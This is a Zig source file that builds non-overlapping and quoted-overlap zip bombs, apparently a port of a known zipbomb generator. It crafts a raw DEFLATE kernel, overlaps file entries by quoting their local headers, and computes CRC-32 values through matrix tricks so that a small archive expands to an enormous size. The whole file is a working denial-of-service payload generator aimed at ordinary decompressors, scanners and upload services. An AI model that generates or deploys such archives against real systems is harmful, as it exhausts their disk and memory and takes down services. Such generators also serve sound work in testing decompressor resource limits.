const std = @import("std");
const args_parser = @import("args");
const archive = @import("archive");
const reader = archive.formats.zip.reader;
// const writer = archive.formats.zip.writer;
const io = std.io;
const fs = std.fs;
const crc_u = @import("crc_utils.zig");
const headers = @import("headers.zig");
const BitBuffer = @import("bit_buffer.zig");

const chosen_byte: u8 = 'a';

const filename_alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

pub fn filename_for_index(i_1: u64, allocator: std.mem.Allocator) ![]u8 {
    var letters = std.ArrayList(u8).init(allocator);
    defer letters.deinit();
    var i: i64 = @intCast(i_1);

    while (true) {
        try letters.insert(0, filename_alphabet[@as(usize, @intCast(i)) % filename_alphabet.len]);
        i = @divFloor(i, filename_alphabet.len) - 1;
        if (i < 0) {
            break;
        }
    }
    return try letters.toOwnedSlice();
}

const TemplateFile = struct {
    header: headers.LocalFileHeader,
    data: []u8,
};

pub fn main() !void {
    var gpa = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer {
        // _ = gpa.detectLeaks();
        _ = gpa.deinit();
    }
    var allocator = gpa.allocator();

    crc_u.init_cache(allocator);
    defer crc_u.deinit_cache();

    const stdErr = std.io.getStdErr().writer();
    const stdOut = std.io.getStdOut();

    var code_length_lengths = std.AutoArrayHashMap(u8, u8).init(allocator);
    defer code_length_lengths.deinit();

    try code_length_lengths.put(0, 2);
    try code_length_lengths.put(1, 3);
    try code_length_lengths.put(2, 3);
    try code_length_lengths.put(18, 1);

    const options = args_parser.parseForCurrentProcess(struct {
        algorithm: enum { bzip2, deflate } = .deflate,
        alphabet: ?[]const u8 = null,
        @"compressed-size": ?u64 = null,
        extra: ?u16 = null,
        @"giant-steps": bool = false,
        @"max-uncompressed-size": ?u64 = null,
        mode: enum { no_overlap, full_overlap, quoted_overlap } = .quoted_overlap,
        @"num-files": ?u32 = null,
        template: ?[]const u8 = null,
        zip64: bool = false,
    }, allocator, .print) catch return;

    defer options.deinit();

    // num-files is required and either compressed-
    if (options.options.@"num-files" == null or
        (options.options.@"compressed-size" == null and options.options.@"max-uncompressed-size" == null))
    {
        try stdErr.print(
            \\  Usage:
            \\    {s}
            \\      --algorithm=ALG            ALG can be "deflate" (default) or "bzip2"
            \\      --alphabet=CHARS           alphabet for constructing filenames
            \\      --compressed-size=N        compressed size of the kernel
            \\      --extra=HHHH               use extra-field quoting with the type tag 0xHHHH
            \\      --giant-steps              quote as many headers as possible, not just one
            \\      --max-uncompressed-size=N  maximum uncompressed size of the kernel
            \\      --mode=MODE                "no_overlap", "full_overlap", or "quoted_overlap" (default)
            \\      --num-files=N              number of files to contain, not counting template files
            \\      --template=ZIP             zip file containing other files to store in the zip bomb
            \\      --zip64                    enable Zip64 extensions
            \\
            \\  Errors:
            \\
        , .{fs.path.basename(options.executable_name.?)});

        if (options.options.@"num-files" == null) {
            try stdErr.print("    <num-files> cannot be empty\n", .{});
        }

        if (options.options.@"compressed-size" == null and options.options.@"max-uncompressed-size" == null) {
            try stdErr.print("    Either <max-uncompressed-size> or <compressed-size> has to be defined\n", .{});
        }
        return;
    }

    var extra_files: std.ArrayList(TemplateFile) = undefined;

    if (options.options.template) |file_path| {
        var file = try fs.cwd().openFile(file_path, .{});
        defer file.close();
        const str = try file.readToEndAlloc(allocator, std.math.maxInt(usize));
        defer allocator.free(str);

        var source = std.io.StreamSource{ .file = file };

        var arc = reader.ArchiveReader.init(allocator, &source);
        defer arc.deinit();

        try arc.load();

        extra_files = try std.ArrayList(TemplateFile).initCapacity(allocator, arc.directory.items.len);

        for (0..arc.directory.items.len) |j| {
            const hdr = arc.getHeader(j);

            var out = try std.ArrayList(u8).initCapacity(allocator, @intCast(hdr.uncompressed_size));

            var filename = try allocator.alloc(u8, hdr.filename.len);

            @memcpy(filename, hdr.filename);

            var header = headers.LocalFileHeader.init(
                hdr.compressed_size,
                hdr.uncompressed_size,
                hdr.crc32,
                filename,
                @intFromEnum(hdr.compression_method),
                null,
                null,
            );

            try arc.extractFile(hdr, out.writer(), true);

            try extra_files.append(.{ .header = header, .data = try out.toOwnedSlice() });
        }
    }

    defer {
        if (options.options.template) |_| {
            while (extra_files.popOrNull()) |file| {
                allocator.free(file.data);
            }
            extra_files.deinit();
        }
    }

    const max_quoted: u16 = if (options.options.@"giant-steps") @as(u16, 0xffff) else 0;

    var buffer = std.ArrayList(u8).init(allocator);
    defer buffer.deinit();
    switch (options.options.mode) {
        .quoted_overlap => {
            var stream = io.StreamSource{ .file = stdOut };

            var quoted = try QuotedOverlap.init(allocator, extra_files);
            defer quoted.deinit();
            var out = try quoted.generate(
                chosen_byte,
                options.options.@"compressed-size",
                options.options.@"max-uncompressed-size",
                1,
            );
            defer out.data.deinit(allocator);

            var num_extra_files: usize = 0;

            if (options.options.extra) |extra_tag| {
                _ = extra_tag;
                var sum: usize = 0;
                while (sum <= 65535) {
                    var filename = try filename_for_index(num_extra_files + 1, allocator);
                    defer allocator.free(filename);
                    sum += 30 + 4 + (if (options.options.zip64) @as(usize, 20) else @as(usize, 0)) + filename.len;
                    num_extra_files += 1;
                }
            }

            var header = headers.LocalFileHeader.init(
                out.data.prefix.len + out.data.suffix.len + out.data.num_zeroes,
                out.size,
                @intCast(crc_u.crc_matrix_apply(out.crc_matrix, null)),
                try filename_for_index(options.options.@"num-files".? - 1, allocator),
                null,
                null,
                null,
            );
            var zero_data = [_]u8{'\x00'};
            const data_ptr = &zero_data;
            const slice = data_ptr[0..];

            var crc_matrix = crc_u.precompute_crc_matrix_repeated(slice, out.size);

            var files = try std.ArrayList(headers.FileRecord).initCapacity(allocator, @intCast(options.options.@"num-files".?));
            defer {
                for (files.items) |*file| {
                    file.deinit(allocator);
                }
                files.deinit();
            }

            try files.append(.{ .header = header, .data = .{ .generated = out.data }, .crc_matrix = crc_matrix });

            var method = headers.compression_method_deflate;

            while (method == headers.compression_method_deflate and files.items.len < (options.options.@"num-files".? - num_extra_files)) {
                const files_len = files.items.len;
                const header_bytes = try files.items[files_len - 1].header.serialize(options.options.zip64, allocator);
                defer allocator.free(header_bytes);
                var num_quoted = header_bytes.len;
                var crc_quoted = std.hash.Crc32.init();
                crc_quoted.update(header_bytes);
                const next_file = files.items[files_len - 1];
                for (1..files_len) |j| {
                    var i = files_len - j;
                    const file_i_header = try files.items[i - 1].header.serialize(options.options.zip64, allocator);
                    defer allocator.free(file_i_header);
                    if (num_quoted + files.items[i].data.size() + file_i_header.len > max_quoted) {
                        break;
                    }
                    num_quoted += files.items[i].data.size() + file_i_header.len;
                    switch (files.items[i].data) {
                        .generated => unreachable,
                        .real_data => |value| {
                            crc_quoted.update(value);
                        },
                    }
                    crc_quoted.update(file_i_header);
                }

                var new_crc = crc_u.crc_combine(crc_quoted.final(), @intCast(next_file.header.crc), next_file.crc_matrix);

                var new_crc_matrix = crc_u.matrix_mul(next_file.crc_matrix, crc_u.memo_crc_matrix_repeated(slice, num_quoted));

                var quote = try headers.Quote.new(0x00, @intCast(num_quoted), @as(u16, @intCast(num_quoted)) ^ 0xffff).toBytes(allocator);

                var new_header = headers.LocalFileHeader.init(
                    quote.len + num_quoted + next_file.header.compressed_size,
                    num_quoted + next_file.header.uncompressed_size,
                    @intCast(new_crc),
                    try filename_for_index(options.options.@"num-files".? - files_len - 1, allocator),
                    method,
                    null,
                    null,
                );
                try files.append(headers.FileRecord{ .header = new_header, .data = .{ .real_data = quote }, .crc_matrix = new_crc_matrix });
            }

            if (options.options.template) |_| {
                for (extra_files.items) |file| {
                    try files.append(headers.FileRecord{
                        .header = file.header,
                        .data = .{ .real_data = file.data },
                        .crc_matrix = crc_u.precompute_crc_matrix(file.data),
                    });
                }
            }
            std.mem.reverse(headers.FileRecord, files.items);

            var offset: usize = 0;

            var central_directory = try std.ArrayList(headers.CentralDirectoryHeader).initCapacity(allocator, files.items.len);
            defer central_directory.deinit();
            for (files.items) |*file| {
                try central_directory.append(headers.CentralDirectoryHeader.new(offset, file.header));
                var header_bytes = try file.header.serialize(options.options.zip64, allocator);
                defer allocator.free(header_bytes);
                offset += try stream.write(header_bytes);
                switch (file.data) {
                    headers.RecordData.real_data => |data| {
                        offset += try stream.write(data);
                    },
                    headers.RecordData.generated => |data| {
                        offset += try stream.write(data.prefix);

                        const buff: [10 * 1024]u8 = comptime [_]u8{'\x00'} ** (10 * 1024);
                        var left = data.num_zeroes;

                        while (left > 0) {
                            var to_write = if (left < (10 * 1024))
                                left
                            else
                                10 * 1024;
                            offset += try stream.write(buff[0..to_write]);
                            left -= to_write;
                        }
                        offset += try stream.write(data.suffix);
                    },
                }
            }
            var cd_offset = offset;
            for (central_directory.items) |*cd_header| {
                var cd_bytes = try cd_header.serialize(options.options.zip64, allocator);
                defer allocator.free(cd_bytes);
                offset += try stream.write(cd_bytes);
            }
            var cd_size = offset - cd_offset;
            var eocd = headers.EndOfCentralDirectory.new(central_directory.items.len, cd_size, cd_offset);
            var eocd_bytes = try eocd.serialize(options.options.zip64, method, allocator);
            defer allocator.free(eocd_bytes);
            offset += try stream.write(eocd_bytes);
        },
        else => {},
    }

    return;
}

const huffman_type = std.AutoArrayHashMap(u64, struct { u64, u64 });

const QuotedOverlap = struct {
    allocator: std.mem.Allocator,
    code_length_lengths: std.AutoArrayHashMap(u64, u64) = undefined,
    files: std.ArrayList(TemplateFile),

    pub fn huffman_codes_from_lengths(self: *QuotedOverlap, code_length: std.AutoArrayHashMap(u64, u64)) !huffman_type {
        var max_length: u64 = 0;
        var bl_count = std.AutoArrayHashMap(u64, u64).init(self.allocator);
        defer bl_count.deinit();
        for (code_length.values()) |length| {
            var count = bl_count.get(length) orelse 0;
            count += 1;
            try bl_count.put(length, count);
            max_length = @max(max_length, length);
        }
        var next_code = std.AutoArrayHashMap(u64, u64).init(self.allocator);
        defer next_code.deinit();
        var code: u64 = 0;
        for (0..@intCast(max_length)) |length| {
            code = (code + (bl_count.get(length) orelse 0)) << 1;
            try next_code.put(length + 1, code);
        }
        var result = huffman_type.init(self.allocator);
        for (code_length.keys()) |sym| {
            // @setRuntimeSafety(true);
            var length = code_length.get(sym).?;
            var next_code_length = next_code.get(length) orelse 0;
            std.debug.assert(next_code_length >> @intCast(length) == 0);
            try result.put(sym, .{ .@"0" = next_code_length, .@"1" = length });
            try next_code.put(length, next_code_length + 1);
        }
        return result;
    }

    pub fn init(allocator: std.mem.Allocator, files: std.ArrayList(TemplateFile)) !QuotedOverlap {
        var self = QuotedOverlap{ .allocator = allocator, .code_length_lengths = std.AutoArrayHashMap(u64, u64).init(allocator), .files = files };
        try self.code_length_lengths.put(0, 2);
        try self.code_length_lengths.put(1, 3);
        try self.code_length_lengths.put(2, 3);
        try self.code_length_lengths.put(18, 1);
        return self;
    }

    pub fn skip(self: *QuotedOverlap, n_1: u64, bits: *BitBuffer, codes: huffman_type) !void {
        var n = n_1;
        var x: u64 = undefined;

        while (n >= 1) {
            if (n < 138) {
                x = n;
            } else if (n < 138 + 11 and self.code_length_lengths.get(18).? < (n - 138) * self.code_length_lengths.get(0).?) {
                x = n - 11;
            } else {
                x = 138;
            }
            var value = codes.get(18).?;
            try bits.push_rev(@intCast(value[0]), @intCast(value[1]));
            try bits.push(@intCast(x - 11), 7);
            n -= x;
        }
        while (n > 0) : (n -= 1) {
            var value = codes.get(0).?;
            try bits.push(@intCast(value[0]), @intCast(value[1]));
        }
    }

    pub fn output_code_length_tree(self: *QuotedOverlap, code_length: std.AutoArrayHashMap(u64, u64), bits: *BitBuffer, codes: huffman_type) !void {
        var curr: u64 = 0;
        const asc_u64 = std.sort.asc(u64);
        var sorted = code_length.keys();
        std.sort.block(u64, sorted, {}, asc_u64);
        for (sorted) |sym| {
            var length = code_length.get(sym).?;
            try self.skip(sym - curr, bits, codes);
            var value = codes.get(length).?;
            try bits.push_rev(@intCast(value[0]), @intCast(value[1]));
            curr = sym + 1;
        }
    }

    pub fn generate(self: *QuotedOverlap, repeated_byte: u8, compressed_size: ?u64, max_uncompressed_size: ?u64, final: u8) !headers.CompressData {
        var code_length_codes = try self.huffman_codes_from_lengths(self.code_length_lengths);
        defer code_length_codes.deinit();

        var ll_lengths = std.AutoArrayHashMap(u64, u64).init(self.allocator);
        defer ll_lengths.deinit();
        try ll_lengths.put(repeated_byte, 2);
        try ll_lengths.put(256, 2);
        try ll_lengths.put(285, 1);
        var ll_codes = try self.huffman_codes_from_lengths(ll_lengths);
        defer ll_codes.deinit();

        var distance_lengths = std.AutoArrayHashMap(u64, u64).init(self.allocator);
        defer distance_lengths.deinit();
        try distance_lengths.put(0, 1);
        var distance_codes = try self.huffman_codes_from_lengths(distance_lengths);
        defer distance_codes.deinit();

        const asc_u64 = std.sort.asc(u64);

        var bits = BitBuffer.init(self.allocator);
        defer bits.deinit();

        try bits.push(0b1, @intCast(final & 1 | 0));
        try bits.push(0b10, 2);
        try bits.push(@intCast(std.sort.max(u64, ll_lengths.keys(), {}, asc_u64).? + 1 - 257), 5);
        try bits.push(@as(u8, @intCast(std.sort.max(u64, distance_lengths.keys(), {}, asc_u64).?)) + 1 - 1, 5);

        const code_length_alphabet = [_]u8{
            16, 17, 18, 0, 8,  7, 9,  6, 10, 5,
            11, 4,  12, 3, 13, 2, 14, 1, 15,
        };
        const num_code_length_codes: u64 = blk: {
            var result: u64 = 0;
            for (self.code_length_lengths.keys()) |sym| {
                result = @max(result, std.mem.indexOfScalar(u8, &code_length_alphabet, @as(u8, @intCast(sym))).?);
            }
            break :blk result + 1;
        };

        try bits.push(@intCast(num_code_length_codes - 4), 4);

        for (code_length_alphabet[0..@intCast(num_code_length_codes)]) |code_length| {
            try bits.push(@intCast(self.code_length_lengths.get(@as(u64, code_length)) orelse 0), 3);
        }

        try self.output_code_length_tree(ll_lengths, &bits, code_length_codes);
        try self.output_code_length_tree(distance_lengths, &bits, code_length_codes);

        var n: usize = 0;
        var value = ll_codes.get(repeated_byte).?;
        try bits.push_rev(@intCast(value[0]), @intCast(value[1]));
        n += 1;

        const is_even = bits.bit_pos % 2 == 0;

        n += (8 - bits.bit_pos + 1) / 2 * 258;

        const prefix: []u8 = try bits.bytes();
        bits.reset();

        var distance = distance_codes.get(0).?;
        var code_285 = ll_codes.get(285).?;
        if (!is_even) {
            try bits.push(@intCast(distance[0]), @intCast(distance[1]));
        }
        if (max_uncompressed_size) |max_size| {
            while ((max_size - n) % 1032 >= 258) : (n += 258) {
                try bits.push_rev(@intCast(code_285[0]), @intCast(code_285[1]));
                try bits.push(@intCast(distance[0]), @intCast(distance[1]));
            }
        } else {
            while (bits.bit_pos + ll_lengths.get(285).? + distance_lengths.get(0).? + ll_lengths.get(256).? <= 8) : (n += 258) {
                try bits.push_rev(@intCast(code_285[0]), @intCast(code_285[1]));
                try bits.push(@intCast(distance[0]), @intCast(distance[1]));
            }
        }
        var code_256 = ll_codes.get(256).?;
        try bits.push_rev(@intCast(code_256[0]), @intCast(code_256[1]));
        var suffix: []u8 = try bits.bytes();

        var num_zeroes: usize = if (max_uncompressed_size) |max_size|
            (@as(usize, @intCast(max_size)) - n) / 1032
        else
            @intCast(compressed_size.? - prefix.len - suffix.len);

        n += num_zeroes * 1032;

        var data = [_]u8{repeated_byte};
        const data_ptr = &data;
        const slice = data_ptr[0..];

        var crc_matrix = crc_u.precompute_crc_matrix_repeated(slice, n);

        //  return compressed_data, n, precompute_crc_matrix_repeated(bytes([repeated_byte]), n)
        return .{ .size = n, .crc_matrix = crc_matrix, .data = .{ .prefix = prefix, .suffix = suffix, .num_zeroes = num_zeroes } };
    }

    pub fn deinit(self: *QuotedOverlap) void {
        self.code_length_lengths.deinit();
    }
};
